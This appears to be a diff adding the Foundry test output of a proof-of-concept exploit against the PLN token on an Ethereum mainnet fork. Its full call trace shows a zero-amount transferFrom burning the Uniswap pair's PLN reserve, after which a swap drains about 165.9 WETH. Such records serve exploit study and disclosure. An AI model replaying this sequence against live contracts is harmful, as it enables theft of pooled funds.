@@ -1,0 +1,145 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/PLN_exp.sol:ContractTest
+[PASS] testPoC() (gas: 964359)
+Logs:
+  before attack: balance of attacker: 0.900000000000000000
+  after attack: balance of attacker: 165.893847285453536788
+
+Traces:
+  [4310] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 20681142 [2.068e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::deal(0x67404bcd629E920100c594d62f3678340F40D95a, 900000000000000000 [9e17])
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [1032459] ContractTest::testPoC()
+    ├─ emit log_named_decimal_uint(key: "before attack: balance of attacker", val: 900000000000000000 [9e17], decimals: 18)
+    ├─ [0] VM::startPrank(0x67404bcd629E920100c594d62f3678340F40D95a, 0x67404bcd629E920100c594d62f3678340F40D95a)
+    │   └─ ← [Return]
+    ├─ [601230] → new AttackerC@0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C
+    │   └─ ← [Return] 3003 bytes of code
+    ├─ [379109] AttackerC::attack{value: 900000000000000000}()
+    │   ├─ [23974] WETH9::deposit{value: 900000000000000000}()
+    │   │   ├─ emit Deposit(dst: AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C], wad: 900000000000000000 [9e17])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xc6764355eea0853e3043d1f6f79ec4df6536365cfe5c46acf541a16c0687637f: 0 → 0x0000000000000000000000000000000000000000000000000c7d713b49da0000
+    │   │   └─ ← [Stop]
+    │   ├─ [24420] WETH9::approve(UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─ emit Approval(owner: AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C], spender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x8c90f72ae4509f34f8ddf2fc9775c9e4ac6f211ac1bc4e983d497b83b82e424e: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   └─ ← [Return] true
+    │   ├─ [24683] PLNTOKEN::approve(UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─ emit Approval(owner: AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C], spender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xa04e850fb2d4fb3a2bcc38da0a1ff3db217c109db423521c347fd86faa47f048: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   └─ ← [Return] true
+    │   ├─ [147697] UniswapV2Router02::swapExactTokensForTokensSupportingFeeOnTransferTokens(900000000000000000 [9e17], 0, [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0xe0c218e1633A5C76d57Ff4f11149F07BfFF16aeA], AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C], 1725500171 [1.725e9])
+    │   │   ├─ [8225] WETH9::transferFrom(AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C], UniswapV2Pair: [0x2b818DD5134CD1761dECdeaA157683a83D32C849], 900000000000000000 [9e17])
+    │   │   │   ├─ emit Transfer(from: AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C], to: UniswapV2Pair: [0x2b818DD5134CD1761dECdeaA157683a83D32C849], value: 900000000000000000 [9e17])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xc6764355eea0853e3043d1f6f79ec4df6536365cfe5c46acf541a16c0687637f: 0x0000000000000000000000000000000000000000000000000c7d713b49da0000 → 0
+    │   │   │   │   @ 0xb2460361b4e870f46b5be37d5602f4a2c60cb32db4c0dc3b557beb00b1c280d9: 0x000000000000000000000000000000000000000000000008f1d5c1cae3740000 → 0x000000000000000000000000000000000000000000000008fe5333062d4e0000
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2665] PLNTOKEN::balanceOf(AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C]) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [2504] UniswapV2Pair::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 165000000000000000000 [1.65e20], 500000000000000000 [5e17], 1725500135 [1.725e9]
+    │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x2b818DD5134CD1761dECdeaA157683a83D32C849]) [staticcall]
+    │   │   │   └─ ← [Return] 165900000000000000000 [1.659e20]
+    │   │   ├─ [123462] UniswapV2Pair::swap(0, 2704383977316086 [2.704e15], AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C], 0x)
+    │   │   │   ├─ [56740] PLNTOKEN::transfer(AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C], 2704383977316086 [2.704e15])
+    │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x2b818DD5134CD1761dECdeaA157683a83D32C849], to: AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C], value: 2704383977316086 [2.704e15])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x7006f8515bad7f0dcf6ce95a747bd86262208d16b7c729f4eb4ae1f3506f33a5: 0x00000000000000000000000000000000000000000000000006f05b59d3b20000 → 0x00000000000000000000000000000000000000000000000006e6bfba5d64210a
+    │   │   │   │   │   @ 0xab5e599e480f93d39ce5567d9bcc98f7b6b80aa5b656638e1fcd66a3085aee09: 0 → 0x00000000000000000000000000000000000000000000000000099b9f764ddef6
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x2b818DD5134CD1761dECdeaA157683a83D32C849]) [staticcall]
+    │   │   │   │   └─ ← [Return] 165900000000000000000 [1.659e20]
+    │   │   │   ├─ [665] PLNTOKEN::balanceOf(UniswapV2Pair: [0x2b818DD5134CD1761dECdeaA157683a83D32C849]) [staticcall]
+    │   │   │   │   └─ ← [Return] 497295616022683914 [4.972e17]
+    │   │   │   ├─ emit Sync(reserve0: 165900000000000000000 [1.659e20], reserve1: 497295616022683914 [4.972e17])
+    │   │   │   ├─ emit Swap(sender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 900000000000000000 [9e17], amount1In: 0, amount0Out: 0, amount1Out: 2704383977316086 [2.704e15], to: AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 8: 0x66d90ae700000000000006f05b59d3b20000000000000008f1d5c1cae3740000 → 0x66d90b0b00000000000006e6bfba5d64210a000000000008fe5333062d4e0000
+    │   │   │   │   @ 9: 0 → 0x0000000000000000000000000000000000001bed61bed61bed61bed61bed61b0
+    │   │   │   │   @ 10: 0 → 0x000000000000000000000000000000002e680000000000000000000000000000
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [665] PLNTOKEN::balanceOf(AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C]) [staticcall]
+    │   │   │   └─ ← [Return] 2704383977316086 [2.704e15]
+    │   │   └─ ← [Stop]
+    │   ├─ [54271] PLNTOKEN::transferFrom(0x3f5a63B89773986Fd436a65884fcD321DE77B832, 0x000000000000000000000000000000000000dEaD, 0)
+    │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x2b818DD5134CD1761dECdeaA157683a83D32C849], to: 0x000000000000000000000000000000000000dEaD, value: 497295516022683914 [4.972e17])
+    │   │   ├─ [7717] UniswapV2Pair::sync()
+    │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x2b818DD5134CD1761dECdeaA157683a83D32C849]) [staticcall]
+    │   │   │   │   └─ ← [Return] 165900000000000000000 [1.659e20]
+    │   │   │   ├─ [665] PLNTOKEN::balanceOf(UniswapV2Pair: [0x2b818DD5134CD1761dECdeaA157683a83D32C849]) [staticcall]
+    │   │   │   │   └─ ← [Return] 100000000000 [1e11]
+    │   │   │   ├─ emit Sync(reserve0: 165900000000000000000 [1.659e20], reserve1: 100000000000 [1e11])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 8: 0x66d90b0b00000000000006e6bfba5d64210a000000000008fe5333062d4e0000 → 0x66d90b0b000000000000000000174876e800000000000008fe5333062d4e0000
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit Transfer(from: 0x3f5a63B89773986Fd436a65884fcD321DE77B832, to: 0x000000000000000000000000000000000000dEaD, value: 0)
+    │   │   ├─ emit Approval(owner: 0x3f5a63B89773986Fd436a65884fcD321DE77B832, spender: AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C], value: 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x7d509c07f0d4edcc2dd1b53aae68677132eb562dcba78e36381b63ccaf66e6ba: 0 → 0x00000000000000000000000000000000000000000000000006e6bfa314ed390a
+    │   │   │   @ 0x7006f8515bad7f0dcf6ce95a747bd86262208d16b7c729f4eb4ae1f3506f33a5: 0x00000000000000000000000000000000000000000000000006e6bfba5d64210a → 0x000000000000000000000000000000000000000000000000000000174876e800
+    │   │   └─ ← [Return] true
+    │   ├─ [665] PLNTOKEN::balanceOf(AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C]) [staticcall]
+    │   │   └─ ← [Return] 2704383977316086 [2.704e15]
+    │   ├─ [62986] UniswapV2Router02::swapExactTokensForTokensSupportingFeeOnTransferTokens(2704383977316086 [2.704e15], 0, [0xe0c218e1633A5C76d57Ff4f11149F07BfFF16aeA, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C], 1725500171 [1.725e9])
+    │   │   ├─ [17089] PLNTOKEN::transferFrom(AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C], UniswapV2Pair: [0x2b818DD5134CD1761dECdeaA157683a83D32C849], 2704383977316086 [2.704e15])
+    │   │   │   ├─ emit Transfer(from: AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C], to: UniswapV2Pair: [0x2b818DD5134CD1761dECdeaA157683a83D32C849], value: 2704383977316086 [2.704e15])
+    │   │   │   ├─ emit Approval(owner: AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C], spender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 115792089237316195423570985008687907853269984665640564039457581303529152323849 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x7006f8515bad7f0dcf6ce95a747bd86262208d16b7c729f4eb4ae1f3506f33a5: 0x000000000000000000000000000000000000000000000000000000174876e800 → 0x00000000000000000000000000000000000000000000000000099bb6bec4c6f6
+    │   │   │   │   @ 0xa04e850fb2d4fb3a2bcc38da0a1ff3db217c109db423521c347fd86faa47f048: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffffffffff6646089b22109
+    │   │   │   │   @ 0xab5e599e480f93d39ce5567d9bcc98f7b6b80aa5b656638e1fcd66a3085aee09: 0x00000000000000000000000000000000000000000000000000099b9f764ddef6 → 0
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [534] WETH9::balanceOf(AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C]) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [504] UniswapV2Pair::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 165900000000000000000 [1.659e20], 100000000000 [1e11], 1725500171 [1.725e9]
+    │   │   ├─ [665] PLNTOKEN::balanceOf(UniswapV2Pair: [0x2b818DD5134CD1761dECdeaA157683a83D32C849]) [staticcall]
+    │   │   │   └─ ← [Return] 2704483977316086 [2.704e15]
+    │   │   ├─ [36468] UniswapV2Pair::swap(165893847285453536788 [1.658e20], 0, AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C], 0x)
+    │   │   │   ├─ [23162] WETH9::transfer(AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C], 165893847285453536788 [1.658e20])
+    │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x2b818DD5134CD1761dECdeaA157683a83D32C849], to: AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C], value: 165893847285453536788 [1.658e20])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xc6764355eea0853e3043d1f6f79ec4df6536365cfe5c46acf541a16c0687637f: 0 → 0x000000000000000000000000000000000000000000000008fe3d5729b05bbe14
+    │   │   │   │   │   @ 0xb2460361b4e870f46b5be37d5602f4a2c60cb32db4c0dc3b557beb00b1c280d9: 0x000000000000000000000000000000000000000000000008fe5333062d4e0000 → 0x0000000000000000000000000000000000000000000000000015dbdc7cf241ec
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x2b818DD5134CD1761dECdeaA157683a83D32C849]) [staticcall]
+    │   │   │   │   └─ ← [Return] 6152714546463212 [6.152e15]
+    │   │   │   ├─ [665] PLNTOKEN::balanceOf(UniswapV2Pair: [0x2b818DD5134CD1761dECdeaA157683a83D32C849]) [staticcall]
+    │   │   │   │   └─ ← [Return] 2704483977316086 [2.704e15]
+    │   │   │   ├─ emit Sync(reserve0: 6152714546463212 [6.152e15], reserve1: 2704483977316086 [2.704e15])
+    │   │   │   ├─ emit Swap(sender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 0, amount1In: 2704383977316086 [2.704e15], amount0Out: 165893847285453536788 [1.658e20], amount1Out: 0, to: AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 8: 0x66d90b0b000000000000000000174876e800000000000008fe5333062d4e0000 → 0x66d90b0b00000000000000099bb6bec4c6f60000000000000015dbdc7cf241ec
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [534] WETH9::balanceOf(AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C]) [staticcall]
+    │   │   │   └─ ← [Return] 165893847285453536788 [1.658e20]
+    │   │   └─ ← [Stop]
+    │   ├─ [534] WETH9::balanceOf(AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C]) [staticcall]
+    │   │   └─ ← [Return] 165893847285453536788 [1.658e20]
+    │   ├─ [9181] WETH9::withdraw(165893847285453536788 [1.658e20])
+    │   │   ├─ [41] AttackerC::receive{value: 165893847285453536788}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit Withdrawal(src: AttackerC: [0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C], wad: 165893847285453536788 [1.658e20])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xc6764355eea0853e3043d1f6f79ec4df6536365cfe5c46acf541a16c0687637f: 0x000000000000000000000000000000000000000000000008fe3d5729b05bbe14 → 0
+    │   │   └─ ← [Stop]
+    │   ├─ [0] 0x67404bcd629E920100c594d62f3678340F40D95a::fallback{value: 165893847285453536788}()
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "after attack: balance of attacker", val: 165893847285453536788 [1.658e20], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 20.76s (18.18s CPU time)
+
+Ran 1 test suite in 22.64s (20.76s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
